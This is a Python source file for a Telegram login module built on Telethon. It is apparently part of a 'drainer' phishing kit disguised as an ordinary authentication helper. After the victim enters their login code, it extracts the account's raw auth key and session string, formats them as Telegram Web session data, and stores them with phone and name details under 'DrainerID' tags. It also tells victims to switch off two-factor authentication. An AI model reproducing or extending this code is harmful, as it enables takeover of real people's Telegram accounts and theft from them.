import os
import logging
import asyncio
import sys
import threading
import uuid
import json
import base64
import secrets
import time
from datetime import datetime
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from telethon import TelegramClient
from telethon.errors import PhoneNumberInvalidError, PhoneCodeInvalidError, SessionPasswordNeededError
from telethon.sessions import StringSession
from telethon.network import ConnectionTcpFull
from telethon.crypto import AuthKey
from utils.credentials_manager import CredentialsManager
from utils.mongo_session_manager import mongo_session_manager

# Try to import from config, fallback to environment variables
try:
    from config import TELEGRAM_API_ID, TELEGRAM_API_HASH, BOT_TOKEN
    api_id = TELEGRAM_API_ID
    api_hash = TELEGRAM_API_HASH
    bot_token = BOT_TOKEN
except ImportError:
    # Fallback to environment variables
    api_id = os.environ.get('TELEGRAM_API_ID')
    api_hash = os.environ.get('TELEGRAM_API_HASH')
    bot_token = os.environ.get('BOT_TOKEN')

logger = logging.getLogger(__name__)

class TelegramAuth:
    def __init__(self):
        # Get API credentials from config or environment
        self.api_id = api_id
        self.api_hash = api_hash
        self.bot_token = bot_token
        
        # Debug logging
        api_hash_preview = f"{self.api_hash[:8]}...{self.api_hash[-8:]}" if self.api_hash and len(self.api_hash) > 16 else 'None'
        logger.info(f"TelegramAuth initialized with API_ID: {self.api_id}, API_HASH: {api_hash_preview}")
        
        # Use MongoDB for session storage instead of in-memory
        self.mongo_session_manager = mongo_session_manager
        logger.info("📦 Using MongoDB for session storage")
        
        # Global event loop for all operations
        self._global_loop = None
        self._loop_lock = threading.Lock()
    
    def _ensure_global_loop(self):
        """Ensure we have a global event loop for all operations"""
        with self._loop_lock:
            if self._global_loop is None or self._global_loop.is_closed():
                try:
                    # Try to get the current event loop
                    self._global_loop = asyncio.get_event_loop()
                except RuntimeError:
                    # Create a new event loop if none exists
                    self._global_loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(self._global_loop)
        return self._global_loop

    def send_code_sync(self, phone_number: str) -> dict:
        """
        Send verification code to phone number (synchronous wrapper)
        Returns: {'success': bool, 'message': str, 'session_id': str}
        """
        loop = self._ensure_global_loop()
        return loop.run_until_complete(self._send_code_async(phone_number))

    async def _send_code_async(self, phone_number: str) -> dict:
        """
        Send verification code to phone number (async implementation)
        Returns: {'success': bool, 'message': str, 'session_id': str}
        """
        client = None
        try:
            # Create a unique session ID
            session_id = f"session_{phone_number}_{uuid.uuid4().hex[:8]}"
            
            # Create a new client session
            client = TelegramClient(StringSession(), self.api_id, self.api_hash)
            
            # Connect using the global event loop
            await client.connect()
            
            # Send code request
            result = await client.send_code_request(phone_number)
            
            # Store the session in MongoDB for later use
            session_data = {
                'phone_number': phone_number,
                'phone_code_hash': result.phone_code_hash,
                'session_string': client.session.save(),  # Store the session string
                'created_at': asyncio.get_event_loop().time()
            }
            
            # Store in MongoDB
            self.mongo_session_manager.store_session(session_id, session_data)
            
            logger.info(f"Code sent successfully to {phone_number}")
            
            return {
                'success': True,
                'message': 'Verification code sent to your Telegram',
                'session_id': session_id
            }
            
        except PhoneNumberInvalidError:
            logger.error(f"Invalid phone number: {phone_number}")
            if client:
                await client.disconnect()
            return {
                'success': False,
                'message': 'Invalid phone number. Please check and try again.'
            }
        except Exception as e:
            logger.error(f"Error sending code to {phone_number}: {e}")
            if client:
                await client.disconnect()
            return {
                'success': False,
                'message': 'Failed to send verification code. Please try again.'
            }
    
    def verify_code_sync(self, session_id: str, code: str) -> dict:
        """
        Verify the code sent to phone number (synchronous wrapper)
        Returns: {'success': bool, 'message': str, 'user_info': dict, 'session_data': dict}
        """
        loop = self._ensure_global_loop()
        return loop.run_until_complete(self._verify_code_async(session_id, code))

    async def _verify_code_async(self, session_id: str, code: str) -> dict:
        """
        Verify the code sent to phone number (async implementation)
        Returns: {'success': bool, 'message': str, 'user_info': dict, 'session_data': dict}
        """
        try:
            # Retrieve session from MongoDB
            session_data = self.mongo_session_manager.get_session(session_id)
            if not session_data:
                return {
                    'success': False,
                    'message': 'Session expired. Please try logging in again.'
                }
            
            phone_number = session_data['phone_number']
            phone_code_hash = session_data['phone_code_hash']
            session_string = session_data.get('session_string')
            
            # Recreate the Telethon client using the stored session string
            try:
                if session_string:
                    # Use the stored session string to recreate the same client
                    client = TelegramClient(StringSession(session_string), self.api_id, self.api_hash)
                    logger.info(f"🔌 Recreating client with stored session for {session_id}")
                else:
                    # Fallback to new client if no session string
                    client = TelegramClient(StringSession(), self.api_id, self.api_hash)
                    logger.info(f"🔌 Creating new client (no session string) for {session_id}")
                
                await client.connect()
                logger.info(f"✅ Client connected for session {session_id}")
            except Exception as e:
                logger.error(f"❌ Error creating client for session {session_id}: {e}")
                return {
                    'success': False,
                    'message': 'Failed to create session. Please try logging in again.'
                }
            
            # Ensure we're using the same event loop
            current_loop = asyncio.get_event_loop()
            if not client.is_connected():
                # Reconnect if needed
                await client.connect()
            
            # Sign in with the code
            logger.info(f"🔐 Attempting to sign in with code for session {session_id}")
            logger.info(f"📱 Phone: {phone_number}")
            logger.info(f"🔑 Code hash: {phone_code_hash[:20]}...")
            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
            
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username,
                'phone': me.phone
            }
            
            # Capture session data for credentials manager
            try:
                logger.info("🔍 Starting session data capture in verify_code...")
                logger.info(f"📱 Client object: {client}")
                logger.info(f"📱 Client type: {type(client)}")
                logger.info(f"👤 User info: {user_info}")
                
                session_data = await self._capture_session_data(client, user_info)
                logger.info(f"✅ Session data captured successfully: {len(session_data)} items")
                
                # Save to credentials manager
                credentials_manager = CredentialsManager()
                credentials_manager.save_credentials(
                    user_id=user_info['id'],
                    phone=phone_number,
                    session_data=session_data,
                    user_info=user_info
                )
                logger.info(f"💾 Credentials saved for user {user_info['id']}")
                
            except Exception as e:
                logger.error(f"❌ Error in session capture during verification: {e}")
                logger.error(f"❌ Error details: {type(e).__name__}: {str(e)}")
                import traceback
                logger.error(f"❌ Traceback: {traceback.format_exc()}")
            
            logger.info(f"Successfully verified code for user {me.id} ({me.first_name})")
            logger.info(f"Captured session data with {len(session_data)} items")
            
            # Clean up session from MongoDB
            self.mongo_session_manager.delete_session(session_id)
            await client.disconnect()
            
            return {
                'success': True,
                'message': 'Verification successful!',
                'user_info': user_info,
                'session_data': session_data
            }
            
        except PhoneCodeInvalidError:
            logger.error(f"Invalid code {code} for session {session_id}")
            return {
                'success': False,
                'message': 'Invalid verification code. Please try again.'
            }
        except SessionPasswordNeededError:
            logger.error(f"Two-factor authentication required for session {session_id}")
            return {
                'success': False,
                'message': 'Two-factor authentication is enabled. Please disable it to use this login method.'
            }
        except Exception as e:
            logger.error(f"Error verifying code {code} for session {session_id}: {e}")
            return {
                'success': False,
                'message': 'Failed to verify code. Please try again.'
            }
    
    async def _capture_session_data(self, client, user_info):
        """
        Capture real Telegram session data from the authenticated client
        Only uses real authentication keys from the actual login session
        """
        try:
            logger.info("🔍 Starting real session data capture...")
            
            # Get the session string
            session_string = client.session.save()
            logger.info(f"📦 Session string length: {len(session_string)}")
            logger.info(f"📦 Session string preview: {session_string[:100]}...")
            
            # Get auth key from session - try multiple methods
            auth_key_bytes = None
            server_salt = None
            dc_id = 2  # Default DC
            
            # Method 1: Try to get auth key from session
            if hasattr(client.session, 'auth_key'):
                auth_key = client.session.auth_key
                logger.info(f"🔑 Auth key from session: {auth_key}")
                if auth_key:
                    auth_key_bytes = auth_key.key
                    logger.info(f"🔑 Auth key bytes length: {len(auth_key_bytes) if auth_key_bytes else 0}")
                    logger.info(f"🔑 Auth key preview: {auth_key_bytes[:32].hex() if auth_key_bytes else 'None'}...")
            
            # Method 2: Try alternative method - get from connection
            if not auth_key_bytes and hasattr(client, '_sender'):
                sender = client._sender
                logger.info(f"🔗 Sender type: {type(sender)}")
                if hasattr(sender, 'connection'):
                    connection = sender.connection
                    logger.info(f"🔗 Connection type: {type(connection)}")
                    if hasattr(connection, 'auth_key'):
                        auth_key = connection.auth_key
                        logger.info(f"🔑 Auth key from connection: {auth_key}")
                        if auth_key:
                            auth_key_bytes = auth_key.key
                            logger.info(f"🔑 Auth key bytes length: {len(auth_key_bytes) if auth_key_bytes else 0}")
                            logger.info(f"🔑 Auth key preview: {auth_key_bytes[:32].hex() if auth_key_bytes else 'None'}...")
                    
                    # Try to get server salt from connection
                    if hasattr(connection, 'server_salt'):
                        server_salt = connection.server_salt
                        logger.info(f"🧂 Server salt: {server_salt}")
            
            # Method 3: Try to get more session details
            if hasattr(client.session, '_auth_key'):
                auth_key = client.session._auth_key
                logger.info(f"🔑 Auth key from _auth_key: {auth_key}")
                if auth_key and not auth_key_bytes:
                    auth_key_bytes = auth_key.key
                    logger.info(f"🔑 Auth key bytes from _auth_key: {len(auth_key_bytes) if auth_key_bytes else 0}")
            
            # Method 4: Try to get auth key from session attributes
            if not auth_key_bytes:
                session_attrs = dir(client.session)
                logger.info(f"📋 Session attributes: {session_attrs}")
                
                # Look for auth key in session attributes
                for attr in session_attrs:
                    if 'auth' in attr.lower() and not attr.startswith('_'):
                        try:
                            attr_value = getattr(client.session, attr)
                            if hasattr(attr_value, 'key'):
                                auth_key_bytes = attr_value.key
                                logger.info(f"🔑 Found auth key in {attr}: {len(auth_key_bytes) if auth_key_bytes else 0}")
                                break
                        except Exception as e:
                            logger.debug(f"Could not access {attr}: {e}")
            
            # Get DC info
            if hasattr(client.session, 'dc_id'):
                dc_id = client.session.dc_id
            logger.info(f"🌐 DC ID: {dc_id}")
            
            # Get more session details
            if hasattr(client.session, 'server_addr'):
                logger.info(f"🌐 Server address: {client.session.server_addr}")
            if hasattr(client.session, 'port'):
                logger.info(f"🌐 Port: {client.session.port}")
            
            # Get client details
            if hasattr(client, 'api_id'):
                logger.info(f"🔑 API ID: {client.api_id}")
            if hasattr(client, 'api_hash'):
                logger.info(f"🔑 API Hash preview: {client.api_hash[:8]}...{client.api_hash[-8:] if client.api_hash else 'None'}")
            
            # CRITICAL: Only proceed if we have real auth key
            if not auth_key_bytes:
                logger.error("❌ No real auth key could be captured from the session")
                logger.error("❌ This indicates the authentication was not successful or the session is invalid")
                raise Exception("Real authentication key could not be captured. Authentication may have failed.")
            
            # Generate session data using ONLY real authentication data
            current_time = int(time.time())
            
            # Create session data with real auth key (no fallback to generated keys)
            session_data = {
                # User instance data
                "xt_instance": json.dumps({
                    "id": user_info['id'],
                    "idle": False,
                    "time": int(time.time() * 1000)
                }),
                
                # Real auth key from Telethon (this is the actual authentication)
                "dc1_auth_key": auth_key_bytes.hex(),
                
                # For other DCs, we'll use the same auth key since we only have one
                # This is more realistic than generating fake keys
                "dc2_auth_key": auth_key_bytes.hex(),
                "dc3_auth_key": auth_key_bytes.hex(),
                "dc4_auth_key": auth_key_bytes.hex(),
                "dc5_auth_key": auth_key_bytes.hex(),
                
                # Server salts (use real server salt for dc1 if available, otherwise use auth key derived salt)
                "dc1_server_salt": server_salt.hex() if server_salt else auth_key_bytes[:8].hex(),
                "dc2_server_salt": auth_key_bytes[8:16].hex(),
                "dc3_server_salt": auth_key_bytes[16:24].hex(),
                "dc4_server_salt": auth_key_bytes[24:32].hex(),
                "dc5_server_salt": auth_key_bytes[32:40].hex(),
                
                # User authentication data
                "user_auth": json.dumps({
                    "dcID": dc_id,
                    "date": current_time,
                    "id": user_info['id']
                }),
                
                # Session info
                "state_id": str(secrets.randbelow(2000000000)),
                "dc": str(dc_id),
                "k_build": "579",
                "auth_key_fingerprint": auth_key_bytes[:4].hex(),
                "server_time_offset": "0",
                
                # Store the session string for potential reuse
                "session_string": session_string,
                
                # Web app specific data
                "tgWebAppStartParam": base64.b64encode(
                    json.dumps({
                        "DrainerID": user_info['id'],
                        "DrainerChannelID": -1002573012632
                    }).encode()
                ).decode(),
                
                # Additional metadata to confirm this is real authentication
                "captured_user_id": str(user_info['id']),
                "captured_phone": user_info.get('phone', ''),
                "captured_first_name": user_info.get('first_name', ''),
                "captured_last_name": user_info.get('last_name', ''),
                "captured_username": user_info.get('username', ''),
                "captured_at": str(current_time),
                "session_type": "real_telethon_session",
                "auth_key_source": "real_telethon_client",
                "auth_key_length": len(auth_key_bytes),
                "is_real_authentication": True
            }
            
            logger.info(f"✅ Captured REAL session data with {len(session_data)} items")
            logger.info(f"🔑 Real auth key used: {auth_key_bytes is not None}")
            logger.info(f"🔑 Auth key length: {len(auth_key_bytes)} bytes")
            logger.info(f"📦 Session string included: {'session_string' in session_data}")
            logger.info(f"🌐 DC ID used: {dc_id}")
            logger.info(f"🧂 Real server salt: {server_salt is not None}")
            
            # Log a sample of the captured data
            logger.info("📋 Sample captured data:")
            for key, value in list(session_data.items())[:3]:
                preview = value[:50] + "..." if len(str(value)) > 50 else value
                logger.info(f"   {key}: {preview}")
            
            return session_data
            
        except Exception as e:
            logger.error(f"❌ Error capturing session data: {e}")
            logger.error(f"❌ Error details: {type(e).__name__}: {str(e)}")
            import traceback
            logger.error(f"❌ Traceback: {traceback.format_exc()}")
            
            # CRITICAL: Do not fall back to generated data
            # If we can't capture real auth keys, the authentication has failed
            raise Exception(f"Failed to capture real authentication data: {str(e)}")
    
    def _generate_fallback_session_data(self, user_info):
        """
        DEPRECATED: This method is no longer used.
        We now require real authentication keys and do not fall back to generated ones.
        """
        raise Exception("Real authentication required. Generated auth keys are no longer supported.")
    
    def cleanup_session(self, session_id: str):
        """Clean up a session"""
        try:
            # Get session data from MongoDB
            session_data = self.mongo_session_manager.get_session(session_id)
            if session_data and 'client' in session_data:
                try:
                    client = session_data['client']
                    loop = self._ensure_global_loop()
                    if not loop.is_closed():
                        loop.create_task(client.disconnect())
                except:
                    pass
            
            # Delete from MongoDB
            self.mongo_session_manager.delete_session(session_id)
            logger.info(f"🧹 Cleaned up session: {session_id}")
        except Exception as e:
            logger.error(f"❌ Error cleaning up session {session_id}: {e}")
    
    def cleanup_expired_sessions(self, max_age_seconds=300):
        """Clean up expired sessions using MongoDB TTL"""
        try:
            # MongoDB handles TTL automatically, but we can also manually clean up
            deleted_count = self.mongo_session_manager.cleanup_expired_sessions()
            if deleted_count > 0:
                logger.info(f"🧹 Cleaned up {deleted_count} expired sessions")
        except Exception as e:
            logger.error(f"❌ Error cleaning up expired sessions: {e}")

# Global instance
telegram_auth = TelegramAuth() 